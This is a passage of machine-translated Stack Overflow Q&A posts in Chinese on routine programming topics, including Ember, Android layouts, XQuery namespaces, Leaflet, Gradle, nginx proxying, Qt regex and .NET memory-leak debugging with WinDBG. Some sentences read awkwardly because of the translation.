public class YourConverter implements Converter {

    @ManagedProperty...
    ...

    //implementation of converter methods

} 
```

当然，阅读 BalusC[在 JSF 2.0 中的无价通信](http://balusc.blogspot.com/2011/09/communication-in-jsf-20.html#ProcessingGETRequestParameters)也会对这个问题有所了解。

还值得一提的是，转换器 bean 的范围可能会更改为，例如，应用程序或会话，如果它不应该保持任何状态。

# ember.js - 使用 Ember 在 {{#each}} 中动态设置控制器

> ID：15392890
> 
> 赞同：1
> 
> 时间：2013-03-13T17:55:45.533
> 
> 标签：ember.js

[在 Ember 中，您可以根据指南](http://emberjs.com/api/classes/Ember.ArrayController.html)动态查找控制器并`{{#each}}`执行以下操作：

模板：

```
{{#each controller}}
  {{name}}  
{{/each}} 
```

阵列控制器：

```
App.DocumentListController = Ember.ArrayController.extend
  lookupItemController: ((object) ->
    if @get('name') == 'something' then 'someController'
    else 'someOtherController' 
```

我有一种情况，我想做同样的事情，但我需要使用 ObjectController 而不是 ArrayController。

所以我的模板看起来更像这样：

```
{{#each controller in controller.documents itemController=lookupItemController}}
  {{name}}
{{/each}} 
```

对象控制器：

```
App.DocumentListController = Ember.ObjectController.extend
  lookupItemController: (object) ->
    if @get('name') == 'something' then 'someController'
    else 'someOtherController' 
```

第二个示例只是编造的，不起作用。 **有没有办法在一个中动态设置这样的控制器`{{#each}}`？**有没有更好的方法来实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T21:29:36.177

在这种情况下，您可能会执行以下操作：

```
App.ListController = Ember.ObjectController.extend
    needs: ['documents']

App.DocumentsController = Ember.ArrayController.extend
    needs: ['list']
    contentBinding: 'controllers.list.documents'
    lookupItemController: (object) ->
        if @get('name') == 'something' then 'someController'
        else 'someOtherController' 
```

然后在您的模板中（假设“ListController”是视图的控制器）：

```
{{#each document in controllers.documents}}
    {{document.name}}
{{/each}} 
```

# android - 仅将 alpha-transparency 设置为布局而不是其子级

> ID：15392897
> 
> 赞同：28
> 
> 时间：2013-03-13T17:56:07.343
> 
> 标签：android, android-layout, alpha-transparency

我发现了这个问题，我也遇到了几乎同样的问题。我如何将 alpha 仅应用于相对布局而不应用于其子布局？有人可以帮忙吗？

> 我有一个矩形 LinearLayout，它有一些边距、一些圆角和 0.3 的 alpha 值。在这个布局中，我有 4 种不同的布局，因为我在不同的位置显示不同的图像。我的问题是，虽然主要布局是 0.3，但我希望我的孩子完全可见，或者不受其父 alpha 的影响，我想知道我该怎么做？我尝试在子布局上设置 alpha=1 但它不起作用。将其设置为 0 确实会使子布局消失，所以看起来我可以减少到 0.3 以下，但不能超过父级。请问这是一个错误还是我做错了？谢谢你。

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-03-14T01:28:02.560

您可以先使用并设置背景图像并设置该孩子的，而不是设置`alpha`父级的。例如`FrameLayout``alpha`

而不是使用这个

```
<LinearLayout 
        android:background="@drawable/background" 
        android:alpha="0.3" >
    <LinearLayout>
        <Button />
        <Button />
    </LinearLayout>     
</LinearLayout > 
```

用这个

```
<FrameLayout>
    <ImageView
        android:background="@drawable/background" 
        android:alpha="0.3" />
    <LinearLayout>
        <Button />
        <Button />
    </LinearLayout>     
</FrameLayout> 
```

# c# - 在我的解决方案资源管理器中，这些挂锁和加号是什么意思？

> ID：15392904
> 
> 赞同：21
> 
> 时间：2013-03-13T17:56:25.820
> 
> 标签：c#, tfs, visual-studio-2012, ide

![在此处输入图像描述](../Images/1181b0ad4aa9979a8d1ee91a48af5891.png)

我认为这与 Team Foundation Service 有关，但这是什么意思？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-03-13T17:57:45.233

锁定表示该项目已签入，+ 表示该项目的添加操作处于挂起状态。

[您可以在 MSDN 上查看 TFS 图标](http://msdn.microsoft.com/en-us/library/ms245455.aspx)的完整列表。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-13T17:58:32.947

加号表示该项目尚未添加到源代码管理中。

挂锁表示该项目在源代码管理中，但尚未签出以进行编辑

复选标记（您没有显示）表示该项目在源代码管理中，但已被签出以进行编辑。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-13T17:58:59.573

`+`表示它是新添加的但未签入 `lock`意味着它存在于 tfs 上并已签入。（仅限可读模式）。当您开始在文件中键入任何内容时，它将被签出（文件上将显示一个勾号）

# java - 为什么此查询不返回数据（在 XQuery、Java 中）？

> ID：15392910
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:56:41.837
> 
> 标签：java, xpath, xquery

这适用于 Java 中使用的 XQuery。我的代码正在处理其他 XML 文件，但这次它没有返回所需的数据。错误代码如下。它有什么问题？谢谢。

```
String queryString =
                    "declare variable $docName as xs:string external;" + sep +
                    "      for $TRACK in doc($docName)/playlist/tracklist/track " +
                    "   return " +
                    " <track><title>{$TRACK/title/text()}</title>" +
                    " <location>{$TRACK/location/text()}</location></track>"; 
```

这是目标 XML：

```
 <?xml version="1.0"?>
    -<playlist xmlns="http://xspf.org/ns/0/" version="1">
       -<trackList>-<track><location>http://radiotool.com/242.mp3</location><title>New                   York</title></track>
                   -<track><location>http://radiotool.com/243.mp3</location> <title>Chicago Repeater</title></track>
</trackList></playlist> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:33:06.963

这可能是因为源 XML 使用名称空间而您的 XPath 没有。这个怎么样：

```
String queryString =
                "declare namespace xsp='http://xspf.org/ns/0/'; " + 
                "declare variable $docName as xs:string external;" + sep +
                "  for $TRACK in doc($docName)/xsp:playlist/xsp:trackList/xsp:track " +
                "   return " +
                " <track><title>{$TRACK/xsp:title/text()}</title>" +
                " <location>{$TRACK/xsp:location/text()}</location></track>"; 
```

# javascript - 在 IE7 Quirks 模式下替代 jQuery Ui Dialog

> ID：15392913
> 
> 赞同：0
> 
> 时间：2013-03-13T17:56:51.790
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-dialog

我有一个必须在 IE7 怪癖模式下运行的页面，并且在我意识到这一点之前一直依赖 jQuery UI 模态对话框。有没有其他选择？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T07:33:03.003

在这种情况下，您可以使用[自定义 js](http://jsfiddle.net/46jYC/3/)，因为它更灵活。要使 div 居中，您应该将显示按钮的 onclick 行为更改为以下内容：

```
pos = get_scroll(); 
$("#dialog").css({ 
    'top': pos.y,
    'left': pos.x + window.screen.availWidth / 2,
    'margin-left': 50}
).show(); 
```

但是您必须实现模态行为才能完成这段代码

# ajax - 使用传单标记簇从 ajax 更新标记

> ID：15392914
> 
> 赞同：0
> 
> 时间：2013-03-13T17:56:59.240
> 
> 标签：ajax, map, leaflet, markerclusterer, geojson

我想将地图与传单集成并使用 ajax 更新标记。

我的地图是通过以下方式创建的：

```
<script type="text/javascript">

    var cloudmadeUrl = "http://{s}.tile.cloudmade.com/BC9A493B41014CAABB98F0471D759707/997/256/{z}/{x}/{y}.png",
        cloudmadeAttribution = "Adrien",
        cloudmade = new L.TileLayer(cloudmadeUrl, {maxZoom: 17, attribution: cloudmadeAttribution}),
    latlng = new L.LatLng( 43.73357176247478,7.428388595581055);

    var map = new L.Map("map", {center: latlng, zoom: 11, layers: [cloudmade]});

        var geoJsonData = {
        "type": "FeatureCollection", 
        "features": [
            { "type": "Feature", "id":"1", "properties": { "address": "2"   }, "geometry": { "type": "Point", "coordinates": [7.428388595581055,43.73357176247478 ] } },
            { "type": "Feature", "id":"2", "properties": { "address": "151" }, "geometry": { "type": "Point", "coordinates": [7.358388595581055,43.73357176247478  ] } },
            { "type": "Feature", "id":"3", "properties": { "address": "21"  }, "geometry": { "type": "Point", "coordinates": [7.398388595581055,43.78357176247478 ] } },
            { "type": "Feature", "id":"4", "properties": { "address": "14"  }, "geometry": { "type": "Point", "coordinates": [175.2240856667,-37.8216963    ] } },
            { "type": "Feature", "id":"5", "properties": { "address": "38B" }, "geometry": { "type": "Point", "coordinates": [175.2196982333,-37.8188702167 ] } },
            { "type": "Feature", "id":"6", "properties": { "address": "38"  }, "geometry": { "type": "Point", "coordinates": [175.2209942   ,-37.8192782833 ] } }
        ]
    };

    var markers = new L.MarkerClusterGroup();

    var geoJsonLayer = L.geoJson(geoJsonData, {
        onEachFeature: function (feature, layer) {
            layer.bindPopup(feature.properties.address);
        }
    });
    markers.addLayer(geoJsonLayer);

    map.addLayer(markers);
document.getElementById("doit").onclick = function () {
        var m = markerList[Math.floor(Math.random() * markerList.length)];
        markers.zoomToShowLayer(m, function () {
            m.openPopup();
        });
    };
    }       

</script> 
```

我想使用一个名为 geojson.php 的 php 文件，它似乎：

```
$geodata='{
        "type": "FeatureCollection", 
        "features": [
            { "type": "Feature", "id":"1", "properties": { "address": "2"   }, "geometry": { "type": "Point", "coordinates": [7.428388595581055,43.73357176247478 ] } },
            { "type": "Feature", "id":"2", "properties": { "address": "151" }, "geometry": { "type": "Point", "coordinates": [7.358388595581055,43.73357176247478  ] } },
            { "type": "Feature", "id":"3", "properties": { "address": "21"  }, "geometry": { "type": "Point", "coordinates": [7.398388595581055,43.78357176247478 ] } },
            { "type": "Feature", "id":"4", "properties": { "address": "14"  }, "geometry": { "type": "Point", "coordinates": [175.2240856667,-37.8216963    ] } },
            { "type": "Feature", "id":"5", "properties": { "address": "38B" }, "geometry": { "type": "Point", "coordinates": [175.2196982333,-37.8188702167 ] } },
            { "type": "Feature", "id":"6", "properties": { "address": "38"  }, "geometry": { "type": "Point", "coordinates": [175.2209942   ,-37.8192782833 ] } }
        ]
    };';
  echo $geodata ;
?> 
```

当我使用[https://github.com/calvinmetcalf/leaflet-ajax](https://github.com/calvinmetcalf/leaflet-ajax)时，我的 geojson 格式无效，但是当我在[http://geojsonlint.com/上对其进行测试时](http://geojsonlint.com/)上对其进行测试时，它似乎是正确的。单击按钮选择要显示的特殊项目时，您是否有想法从 php 文件中更新标记。

问候阿德里安

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T00:16:36.453

您可能需要`application/json`在 PHP 代码中设置 HTTP 响应的内容类型（请参阅[https://stackoverflow.com/questions/267546/correct-http-header-for-json-file](https://stackoverflow.com/questions/267546/correct-http-header-for-json-file)）。

问候， 布莱恩

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-23T04:45:56.223

我已经用codeigniter完成了这个，也许会有一点帮助..

视图.php

```
<link href="maps/dist/leaflet.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="maps/dist/leaflet.js"></script>
<script>

var map = L.map('map').setView([0, 0], 2);

//i use my own custom maps..
L.tileLayer( 'maps/srimaps/{z}/{x}/{y}.png', {minZoom: 1, maxZoom: 8, attribution: '', tms: true} ).addTo(map);

//when i click on a class named 'posisi', it gets Lat & Lng rows data from mysql table..
$( 'body' ).delegate( 'a.posisi', 'click', function()
{
    var data = {id:S(this).attr('id');      
    $.ajax({
        type: 'POST',
        url: 'index.php/plan/wip/posisi_item', //name of function in controller..
        dataType:'json',
        data:data,
        success: function( response ) 
        {   
                //for every array data..
                for( var i = 0; i < response.features.length; i ++)
                {
                    L.geoJson(response.features[i]).addTo(map).bindPopup("Item : "+response.features[i].properties.name+"<br>Qty : "+response.features[i].properties.comment);
                }   

        }
    });
});
</script> 
```

..然后控制器.php

```
function posisi_item()
{   
    $geojson = array( 'type' => 'FeatureCollection', 'features' => array() );

    $query=$this->db->query("SELECT * FROM stock_awal");
    foreach($query->result_array() as $row)
    {
        $feature = array( 'type' => 'Feature', 
                          'geometry' => array(
                                              'type' => 'Point',
                                              'coordinates' => array( (float)$row['lng'], (float)$row['lat'])),
                                              'properties' => array(
                                                                    'name' => $row['item'],
                                                                    'show_on_map'=>'true',
                                                                    'comment' => $row['qty'])
        );

        array_push($geojson['features'], $feature);
    }

    echo json_encode($geojson);

} 
```

..而已。

# war - gradle 自定义战争任务 webAppDirName

> ID：15392919
> 
> 赞同：3
> 
> 时间：2013-03-13T17:57:15.763
> 
> 标签：war, gradle

我的构建文件中有一些 gradle 战争任务，我想更改`webAppDirName`每个战争任务。我试过这个：

```
task myWarTask(type: War) {
    ext.webAppDirName = 'src/anotherfolder/webapp' // also tried just webAppDirName
    version ""
    destinationDir = file("$buildDir/libs")
    baseName = 'myWarName'
    classpath = configurations.myWarConfiguration
} 
```

但这仍然是在拉取内容`src/main/webapp`而不是`src/anotherfolder/webapp`

我可以`webAppDirName`像这样在每个war文件的基础上配置吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-14T18:00:17.367

每个项目只有一个`webAppDirName`属性，War 插件会自动`from`为每个`War`任务添加一个对应的属性。所以主要问题是如何撤消它`from`。我认为以下应该有效：

```
apply plugin: "war"

webAppDirName = "non/existing/dir"

task myWarTask(type: War) {
    from "src/anotherfolder/webapp"
    ...
} 
```

另一种方法是仅使用`War`任务类型，而不使用 War 插件。然后你将不得不配置更多的任务属性，并且会失去一些功能，主要与*提供*的配置和战争的发布有关。当然，您可以通过显式配置来弥补这一点（如有必要）。如果您对细节感兴趣，请查看 War 插件的[源代码](https://github.com/gradle/gradle/blob/master/subprojects/plugins/src/main/groovy/org/gradle/api/plugins/WarPlugin.java)。

PS：`webAppDirName`不是额外的属性（ ），而是插件`ext.`添加的约定属性。`War`额外属性仅用于构建脚本中的临时使用。您`ext.`在编写额外属性时会使用它，但在读取属性时将其省略。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T19:05:42.407

```
task myWarTask(type: War) {
    from 'src/anotherfolder/webapp'
    version ""
    destinationDir = file("$buildDir/libs")
    baseName = 'myWarName'
    classpath = configurations.myWarConfiguration
} 
```

# .net - 如何在 vb.net 中杀死、存储和打开进程

> ID：15392920
> 
> 赞同：-2
> 
> 时间：2013-03-13T17:57:19.413
> 
> 标签：.net, vb.net, process

我正在获取正在运行的进程列表，杀死一个特定的进程，然后在窗体关闭时再次打开它。

问题是要在表单关闭时再次打开该过程，我正在将程序搜索到特定路径

```
 If File.Exists("path") Then
        Dim t As Process = Process.Start("path")
    Else
        Return
    End If 
```

是否可以在终止进程之前将进程存储在某个地方，然后在表单关闭后再次调用它？我问这个问题是因为如果有人选择将程序安装到另一个路径中，则此代码将不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:04:56.977

在终止进程之前，您可以使用它`Process.MainModule.FileName`来获取完全限定的路径。然后，您可以存储此字符串，直到您需要重新启动它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-10T22:50:38.970

假设安装路径没有注册表项，可以搜索文件并引用路径：

```
For Each foundFile As String In My.Computer.FileSystem.GetFiles(
     My.Computer.FileSystem.SpecialDirectories.MyDocuments,
     Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "path")

     Listbox1.Items.Add(foundFile.Substring(0, foundFile.LastIndexOf("\"))) 
Next 
```

资料来源： [如何：在 Visual Basic 中查找具有特定模式的文件](https://msdn.microsoft.com/en-us/library/6zwyt2y8.aspx)

# nginx - 多个域名的nginx配置

> ID：15392926
> 
> 赞同：2
> 
> 时间：2013-03-13T17:57:36.620
> 
> 标签：nginx

我刚刚安装了 nginx，并且有多个域名指向同一个 IP。当调用每个域时，我必须重定向到在同一台机器上运行的不同应用程序，每个应用程序都在不同的端口上运行。

例如，我有`app1.domain.com`, `app2.domain.com`&`app3.domain.com`

所以，因为`app1.domain.com`我必须重定向到`localhost:<port1>` 同样，`app2.domain.com`我必须重定向到`localhost:<port2>` ，`app3.domain.com`我必须重定向到`localhost:<port3>`

我该怎么办？

提前致谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T18:45:55.623

好吧，如果您的应用程序在不同的端口上运行，那么您的 nginx 配置文件应该如下所示。

```
upstream app1  {
      server 127.0.0.1:port1; #App1
}

upstream app2  {
      server 127.0.0.1:port2; #app2
}

server {
    listen       xxx.xxx.xxx.xxx:80;
    server_name  app1.domain.com;

    access_log  /var/log/nginx/log/app1.domain.com.access.log  main;
    error_log  /var/log/nginx/log/app1.domain.com.error.log;
    root   /usr/share/nginx/html;
    index  index.html index.htm;

    ## send request back to apache1 ##
    location / {
    proxy_pass  http://app1;
    proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
    proxy_redirect off;
    proxy_buffering off;
    proxy_set_header        Host            $host;
    proxy_set_header        X-Real-IP       $remote_addr;
    proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
   }
}

server {
   listen      xxx.xxx.xxx.xxx:80;
   server_name app2.domain.com;
   access_log  /var/log/nginx/log/app2.domain.com.access.log  main;
   error_log   /var/log/nginx/log/app2.domain.com.error.log;
   root        /usr/local/nginx/html;
   index       index.html;

   location / {
        proxy_pass  http://app2;
        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503         http_504;
        proxy_redirect off;
        proxy_buffering off;
        proxy_set_header        Host            app2.domain.com;
        proxy_set_header        X-Real-IP       $remote_addr;
        proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
    }
} 
```

如果您有任何疑问，请告诉我。谢谢

# c++ - 括号和新行或“\r”的Qt / QRegExp正则表达式？

> ID：15392930
> 
> 赞同：0
> 
> 时间：2013-03-13T17:57:47.183
> 
> 标签：c++, regex, qt

我对使用 Qt QRegExp 捕获文本感到困惑。我想从 PHP 代码中获取简单的数据：

```
 public function asr($x)
    {
            echo "index";
    } 
```

说明：

```
 public function <can be more spaces or new lines...> asr($x) <can be more spaces or/and new lines or/and tabs...>
    {
            echo "index";
    } 
```

我想从 PHP 文件中获取什么？这是一...

```
 public function asr($x)
    { 
```

我现在是怎么被抓住的？

```
 QRegExp reg("(public|private|protected|static|final)(.*)function(.*)[\(](.*)[\)](.*)[\n](.*)‌​[\{]", Qt::CaseInsensitive); 
```

说明：

当我尝试添加`[\{]`或`(\{)`从 PHP 文件中获取大括号时，它不会获取数据：

仅结果：

```
 public function asr($x) 
```

反而：

```
 public function asr($x) { 
```

注意：`($x)`和 之间`{`可以是换行符`\n`或一些空格作为`\s`.

这将是`(\))(\n|\s)`但没有运气:(

## 使用示例代码解决的结果：

```
 if (file.open(QIODevice::ReadOnly))
    {
        QTextStream in(&file);

        // regex for function with new line
        QRegExp reg("((.*)public|private|protected|static|final)( *)function(.*)[(](.*)", Qt::CaseInsensitive);

        // capture to list
        QStringList list = reg.capturedTexts();

        qDebug() << list;

        while ( !in.atEnd() )
        {

            QString line_read = in.readLine();

            //qDebug() << line_read;        // read lines

            qDebug() << reg.exactMatch(line_read);  // find matches
        }
    }
    }

FINAL RESULTS:

false 
false 
false 
false 
false 
false 
false 
false 
true        // means found on this line for QRegExp policies
false 
false 
false 
false 
true 
false 
false 
false 
false 
true 
false 
false 
false 
false 
true 
false 
false 
false 
false 
false 
false 
false 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:04:22.723

您必须在a 中使用`\\`反斜杠`""`。

编辑：

你也不必`(){`在一个`[]`

```
QRegExp function("(public|private|protected|static|final)( *)function(.*)[(](.*)[)](.*)[{]", Qt::CaseInsensitive);
auto b = function.exactMatch( "public function ($d) \n {" );
b = function.exactMatch( "public function ($d){" ); 
```

为我工作。空白被消耗`(.*)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:25:15.843

我知道有什么问题，逐行读取而不是文件中的所有行，然后应该替换文件中的文本。我不应该使用 读取文件`in.readLine()`，所以我`{`在这一行找到，但不存在，因为大括号`{`在下一行！

# reporting-services - 如何从 SSRS 2008 R2 报告中每 10 秒生成一个 HTML 文件

> ID：15392935
> 
> 赞同：0
> 
> 时间：2013-03-13T17:58:05.050
> 
> 标签：reporting-services, ssrs-2008

我有一个没有参数的 SSRS 2008 R2 必须每 10 秒刷新一次 - 一个仪表板。

但我需要添加更多 HTML 内容，因为 SSRS 2008 R2 不支持所有 HTML 标签。

如何让 SSRS 2008 R2 每 10 秒生成一个包含 HTML 的文件，然后我可以将其包含在我的“主”HTML 页面中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T19:45:33.830

您可以在 HTML 中创建一个表单，然后使用 SSRS Web 服务来获取该表单的信息。

它在 HTML 中与此类似：

< FORM id="frmExample" action="http://(servername) /ReportServer/(报告路径)" method="post" target="_self">

< input type="hidden" name="(VariableName)" value="(value)">

< /表格>

对于更新仪表板部分，我认为您可能能够在 HTML 上处理它，但即使您选择刷新 SSRS 服务器上的报告，我也不确定它是否会刷新表单中的依赖对象。您可能需要尝试看看。很奇怪你是怎么得到它的，但是你点击设计查看器之外的任何地方，然后点击 F4 来获取属性。有一个“自动刷新”属性。将其设置为您希望自动刷新的持续时间（以秒为单位）。

我从这本书中得到了这个，但除了在实验室之外，我从来没有做过。

Brian Larson 的“Microsoft SQL Server 2008 报告服务”

# c# - C# .NET 内存泄漏：GC 阶段#1 和阶段#2 运行时的锯齿状内存使用情况

> ID：15392942
> 
> 赞同：1
> 
> 时间：2013-03-13T17:58:23.943
> 
> 标签：c#, .net, linq-to-sql, memory-leaks

我有一个事件驱动的应用程序，我的任务是维护。每 30 秒大约有 100 个事件在不同的计时器上运行。随着时间的推移，这些事件会变成每秒大约 1-3 个事件的恒定流。内存使用似乎不依赖于任何给定秒内触发的事件数。每个事件都从 Web 服务轮询数据，使用 LINQ2SQL DataContext 对照先前轮询的数据检查数据（完成后我不会处理或清空 DataContext），如果数据不同，则更新数据库并将新数据推送为通过 TCP 向接收者服务发送 XML 消息。

此应用程序似乎有内存泄漏

1.  仅在运行 30m+ 后才出现（调试或发布）
2.  分析时不会显示 [我正在使用 .NET Memory Profiler 4.5]

特点：在启动程序使用〜30MB。随着时间的推移，任务管理器中的内存使用量将开始急剧上升，起初只是轻微的，介于 50 到 150MB 之间，最终会变得更糟，在 200MB 和 1GB+ 之间波动。发生这种情况时，它会在一两秒内发生几次，然后在接下来的 10-20 秒左右稳定在 ~150MB。

我一直在尝试使用内存分析来捕捉这种行为。到目前为止，我一直没有成功，当分析器不观看时，我无法让应用程序在内存使用量附近的任何地方进行 pogo 或振荡。但是，当垃圾收集器阶段 1 和 2 运行时，我注意到内存使用的方波模式看起来与我在任务管理器中看到的非常相似，除了方波中的内存使用波动是10MB 宽，而不是 800MB+（200MB 到 1GB+）。现在，根据 Google 图片，正常运行的应用程序中的垃圾收集看起来更像是锯齿波而不是方形。

坦率地说，我没有看到我的应用程序可能在一秒钟内使用 200MB 到 1GB+ 的内存使用量并且不会将 CPU 提高到 100%。

我已经阅读了一些在垃圾收集 + 事件处理之间可能出现的问题，但我有几条路径可以调查，并试图缩小花时间在哪一条上。我在 .NET 上的速度仍然很慢，并且还没有开发出我对运行 C 的嵌入式设备的“直觉”，这通常可以帮助我过滤我应该首先调查的内容。如果感觉可能是某些事件处理程序正在丢失并重新获得对 [大量数据] 的引用（我不知道这怎么可能发生？），因为内存使用量似乎在垃圾收集器运行并将内存使用量降至 200MB。

此应用程序的早期版本没有这些问题。从那以后我做了两个改变包括

1.  利用 LINQ2SQL 而不是我们自己的数据管理器（它有一个 ADORecordSetHelper 对象，我们用来执行硬编码的 SQL 语句）
2.  更改我们用来将 TCP XML 消息发送到接收器的软件。由于我们在 #2 中所做的事情很简单，它可能是问题的根源，但这种内存使用行为让我不这么认为。

我想我此时的主要问题是

*   在我从创建它们的方法返回之前，我应该在我的 LINQ2SQL DataContexts 上调用 dispose 吗？
*   我应该将它们清空吗？
*   如果在创建 DataContext 后方法中的某处发生异常，是否会导致 DataContext 无限期地保存在内存中？
*   如果我将 LINQ 查询的结果存储到值类型（即 int 而不是 var），那么它是延迟加载的，还是在使用变量时延迟加载的？
*   假设事件驱动框架丢失和重新获得引用的可能性有多大？

编辑：这些事件具有基于实例的订阅，就像[这里](https://stackoverflow.com/questions/298261/do-event-handlers-stop-garbage-collection-from-occuring)讨论的那样，并且在应用程序的生命周期内永远不会取消订阅。

编辑2：终于设法在探查器中捕捉到它，似乎是一个 200MB 的 system.string 正在以某种方式创建。感谢大家排除 GC 行为。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-14T11:08:16.177

大多数情况下，内存泄漏是由对象之间的奇怪引用引起的（这里还包括事件和委托）。

我认为您可以尝试以下方法：

1.  运行应用程序并重现问题。当内存的私有工作集达到非常高的值时，右键单击任务管理器上的进程并选择“创建转储文件”。这将比实时分析应用程序的侵入性要小得多。
2.  下载 WinDBG 并运行它。
3.  通过转到“文件”菜单并选择“打开转储文件”来打开内存转储（我不记得确切的菜单选项的名称是什么......不过应该很容易发现）。
4.  运行以下命令：

    .symfix

    .loadby sos clr

    !dumpheap -type [YourAssemblyNameSpacePrefix] -stat

5.  最后一个命令将为您提供内存中不是 CLR 类型的所有实例，只有您的类型。查看具有大量实例的类型，并尝试查看是否有任何不正确的地方。

6.  如果您看到大量相同类型的对象，请运行以下命令，该命令将显示所有实例的地址：

    !dumheap -type [TheFullObjectTypeName]

    您将需要选择一个实例地址。现在运行以下命令以查看对该实例的引用：

    !gcroot [实例地址]

对不同的实例重复步骤 6 几次，以便您可以确认泄漏来自同一位置或帮助您确定导致这些实例未被收集的原因（仍被其他对象引用）。

如果您没有发现自己的类型有任何奇怪之处，请将步骤 4 中的 !dumpheap 命令更改为：!dumpheap -stat。这样您就不会按类型过滤，您还将看到 CLR 类型和第三方库类型。

这有点复杂，但希望我能够为您提供一种方法来帮助您弄清楚如何查找内存泄漏。

# c# - 活动目录查询与 sql server

> ID：15392946
> 
> 赞同：0
> 
> 时间：2013-03-13T17:58:33.280
> 
> 标签：c#, visual-studio-2010, sql-server-2008, active-directory

我目前正在开发一个只能在内部使用的网络应用程序。该应用程序的一部分需要当前存储在我们的 Active Directory 中的员工信息。我已经设置了一个 sql server 数据库，我将在其中存储信息，但我不确定它是否需要。我可以随时查询 AD 以获取我需要的信息，那么是否有必要将其第二次存储在 sql server 中？如果我偶尔针对 AD 与 sql server 运行查询，是否会出现任何重大的性能问题？将所有内容存储在我的 sql 数据库中可能更简单，但我想获得其他一些输入/建议，因为我从来没有使用过活动目录。（此外，这不是一个数据/网络繁重的应用程序 - 少于 25 人将使用它）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:05:13.270

诚实披露——我也没有丰富的广告经验。

如果您将 AD 中的信息复制到 SQL 服务器中，那么您将面临检测它何时更改并更新 SQL 副本的问题。您的 SQL 副本会以某种方式滞后或不同于 AD 中的权威信息，并且您的应用程序将被称为不准确。缓存和确保缓存准确性是一个非常困难的问题。如果你不需要，为什么要接受它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:08:48.787

对于轻度使用，我认为 AD 域可以很好地处理它。如果我理解正确，域控制器在多台服务器之间进行负载平衡。它这样做是为了进行身份验证，但我不确定查询。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-14T05:07:41.970

目录是为使用 LDAP 进行简单查询而构建的实体。目录的主要目标是集中用户信息，以避免在多个数据库中重复。

所以答案是肯定使用您的目录并使用 LDAP 询问它（在您的情况下通过 ADSI）。

如果您开始计划频繁更新用户数据，则需要在数据库中复制条目。

# azure - 匹配 Windows Azure 中的部署 ID

> ID：15392947
> 
> 赞同：1
> 
> 时间：2013-03-13T17:58:37.233
> 
> 标签：azure, azure-worker-roles

我有几个不同的服务运行与 windows azure worker 角色相同的代码库。我正在尝试测试并查看当前执行的代码是否在特定实例中运行。如果我在管理 API 中调用它：

```
 HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(
        new Uri("https://management.core.windows.net/" + subscriptionId + "/services/hostedservices/<<servicename>>/deploymentslots/production?embed-detail=true")); 
```

我得到这样的回应：

```
 <Deployment xmlns="http://schemas.microsoft.com/windowsazure" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
  <Name>c8bd3b12f1bc4e0db9d8c1d59e97e48b</Name>
  <DeploymentSlot>Production</DeploymentSlot>
  <PrivateID>d1ea61e367e84aedb68de97eded3e896</PrivateID>
  <Status>Running</Status>
  <Label>SXRlbVVwZGF0ZXIgLSAzLzEzLzIwMTMgMTA6NDQ6MTUgQU0=</Label>
  <Url>http://itemupdater3.cloudapp.net/</Url>
  <RoleInstanceList>
    <RoleInstance>
      <RoleName>UpdateItems</RoleName>
      <InstanceName>UpdateItems_IN_0</InstanceName>
      <InstanceStatus>Ready</InstanceStatus>
    </RoleInstance>
  </RoleInstanceList>
  <UpgradeDomainCount>1</UpgradeDomainCount>
  <RoleList>
    <Role>
      <RoleName>UpdateItems</RoleName>
      <OsVersion>WA-GUEST-OS-1.22_201302-02</OsVersion>
    </Role>
  </RoleList>
</Deployment> 
```

我正在尝试测试并查看当前执行的代码是否与此响应具有相同的 ID。如果我比较：

```
xml["Deployment"]["Name"].InnerText; 
```

到

```
RoleEnvironment.CurrentRoleInstance.Role.Instances[0].Id; 
```

它永远不会匹配。如何将 C# 中的内容与 API 返回的 ID 匹配？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T19:15:01.403

您正在尝试将部署的名称（通常是单个类似 guid 的字符串，每次重新部署时唯一）与实例的名称（遵循 RoleName_IN_xxx 模式）进行比较。他们永远不会匹配。

我不能 100% 确定您要做什么，但是对 Service Management API 的调用永远不会为您提供有关当前实例的信息——因为它不知道您从哪里运行；您甚至可以从非 Azure 资源调用 API。它只会为您提供有关整个订阅的数据。

RoleEnvironment.CurrentRoleInstance.Id 将为您提供当前实例的 ID。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T22:52:07.927

kevin，使用 RoleEnvironment.DeploymentId 而不是 RoleEnvironment.CurrentRoleInstance。这将允许您将当前运行的内容与您从服务管理 API 获得的内容进行比较。

# c# - 将实体框架 Linq 查询打印为字符串

> ID：15392948
> 
> 赞同：2
> 
> 时间：2013-03-13T17:58:42.260
> 
> 标签：c#, entity-framework

